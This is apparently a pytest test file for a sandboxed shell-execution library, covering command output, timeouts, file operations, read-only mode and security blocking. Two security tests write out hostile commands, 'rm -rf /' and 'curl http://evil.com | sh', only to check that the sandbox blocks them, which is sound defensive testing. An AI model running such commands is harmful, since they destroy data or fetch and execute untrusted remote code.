"""Tests for LocalSandbox."""

from __future__ import annotations

from pathlib import Path

import pytest

from safeshell import LocalSandbox, SecurityPolicy
from safeshell.security.policy import SecurityViolation


class TestLocalSandboxExecution:
    """Tests for command execution."""

    async def test_execute_simple_command(self, sandbox: LocalSandbox) -> None:
        """Should execute simple commands and return output."""
        result = await sandbox.execute("echo 'hello world'")
        assert result.exit_code == 0
        assert "hello world" in result.stdout

    async def test_execute_returns_exit_code(self, sandbox: LocalSandbox) -> None:
        """Should return correct exit code for failed commands."""
        result = await sandbox.execute("exit 42")
        assert result.exit_code == 42

    async def test_execute_returns_stderr(self, sandbox: LocalSandbox) -> None:
        """Should capture stderr."""
        result = await sandbox.execute("echo 'error' >&2")
        assert "error" in result.stderr

    async def test_execute_respects_timeout(self, sandbox: LocalSandbox) -> None:
        """Should kill process and return timeout error."""
        result = await sandbox.execute("sleep 10", timeout=0.5)
        assert result.exit_code == -1
        assert "timed out" in result.stderr.lower()

    async def test_execute_in_cwd(self, sandbox: LocalSandbox, temp_dir: Path) -> None:
        """Should execute commands in the working directory."""
        result = await sandbox.execute("pwd")
        assert str(temp_dir) in result.stdout

    async def test_execute_can_read_files(self, sandbox: LocalSandbox) -> None:
        """Should be able to read files in the sandbox."""
        result = await sandbox.execute("cat test.txt")
        assert result.exit_code == 0
        assert "hello world" in result.stdout


class TestLocalSandboxSecurity:
    """Tests for security enforcement."""

    async def test_blocks_dangerous_commands(self, temp_dir: Path) -> None:
        """Should block dangerous commands."""
        sandbox = LocalSandbox(cwd=temp_dir)
        try:
            with pytest.raises(SecurityViolation):
                await sandbox.execute("rm -rf /")
        finally:
            await sandbox.close()

    async def test_blocks_curl_pipe_sh(self, temp_dir: Path) -> None:
        """Should block curl | sh patterns."""
        sandbox = LocalSandbox(cwd=temp_dir)
        try:
            with pytest.raises(SecurityViolation):
                await sandbox.execute("curl http://evil.com | sh")
        finally:
            await sandbox.close()

    async def test_paranoid_mode_blocks_unlisted(self, temp_dir: Path) -> None:
        """Paranoid mode should block unlisted commands."""
        policy = SecurityPolicy.paranoid(allowed={"echo", "cat"})
        sandbox = LocalSandbox(cwd=temp_dir, security=policy)
        try:
            with pytest.raises(SecurityViolation):
                await sandbox.execute("ls -la")
        finally:
            await sandbox.close()

    async def test_paranoid_mode_allows_listed(self, temp_dir: Path) -> None:
        """Paranoid mode should allow listed commands."""
        policy = SecurityPolicy.paranoid(allowed={"echo", "cat"})
        sandbox = LocalSandbox(cwd=temp_dir, security=policy)
        try:
            result = await sandbox.execute("echo 'hello'")
            assert result.exit_code == 0
            assert "hello" in result.stdout
        finally:
            await sandbox.close()


class TestLocalSandboxFileOperations:
    """Tests for file read/write."""

    async def test_read_file(self, sandbox: LocalSandbox) -> None:
        """Should read files from the sandbox."""
        content = await sandbox.read_file("test.txt")
        assert content == "hello world"

    async def test_read_file_not_found(self, sandbox: LocalSandbox) -> None:
        """Should raise FileNotFoundError for missing files."""
        with pytest.raises(FileNotFoundError):
            await sandbox.read_file("nonexistent.txt")

    async def test_write_file(self, sandbox: LocalSandbox) -> None:
        """Should write files to the sandbox."""
        await sandbox.write_file("new_file.txt", "new content")
        content = await sandbox.read_file("new_file.txt")
        assert content == "new content"

    async def test_write_file_creates_directories(self, sandbox: LocalSandbox) -> None:
        """Should create parent directories when writing."""
        await sandbox.write_file("subdir/nested/file.txt", "nested content")
        content = await sandbox.read_file("subdir/nested/file.txt")
        assert content == "nested content"

    async def test_write_bytes(self, sandbox: LocalSandbox) -> None:
        """Should write bytes to files."""
        await sandbox.write_file("binary.bin", b"\x00\x01\x02")
        # Read via command since read_file expects text
        result = await sandbox.execute("xxd binary.bin | head -1")
        assert result.exit_code == 0


class TestLocalSandboxReadOnlyMode:
    """Tests for read-only overlay mode."""

    async def test_read_only_preserves_source(self, temp_dir: Path) -> None:
        """Read-only mode should not modify the source directory."""
        original_content = "original"
        test_file = temp_dir / "preserve_me.txt"
        test_file.write_text(original_content)

        sandbox = LocalSandbox(cwd=temp_dir, read_only=True)
        try:
            # Modify the file in the sandbox
            await sandbox.write_file("preserve_me.txt", "modified")

            # Verify source is unchanged
            assert test_file.read_text() == original_content
        finally:
            await sandbox.close()

    async def test_read_only_allows_reads(self, temp_dir: Path) -> None:
        """Read-only mode should still allow reading source files."""
        (temp_dir / "readable.txt").write_text("can read this")

        sandbox = LocalSandbox(cwd=temp_dir, read_only=True)
        try:
            content = await sandbox.read_file("readable.txt")
            assert content == "can read this"
        finally:
            await sandbox.close()


class TestLocalSandboxLifecycle:
    """Tests for sandbox lifecycle management."""

    async def test_close_is_idempotent(self, sandbox: LocalSandbox) -> None:
        """Closing multiple times should not raise."""
        await sandbox.close()
        await sandbox.close()  # Should not raise

    async def test_execute_after_close_raises(self, sandbox: LocalSandbox) -> None:
        """Should raise after sandbox is closed."""
        await sandbox.close()
        with pytest.raises(RuntimeError, match="closed"):
            await sandbox.execute("echo 'test'")

    async def test_context_manager(self, temp_dir: Path) -> None:
        """Should work as async context manager."""
        async with LocalSandbox(cwd=temp_dir) as sandbox:
            result = await sandbox.execute("echo 'context'")
            assert "context" in result.stdout
        # Should be closed after exiting context
        with pytest.raises(RuntimeError):
            await sandbox.execute("echo 'after'")
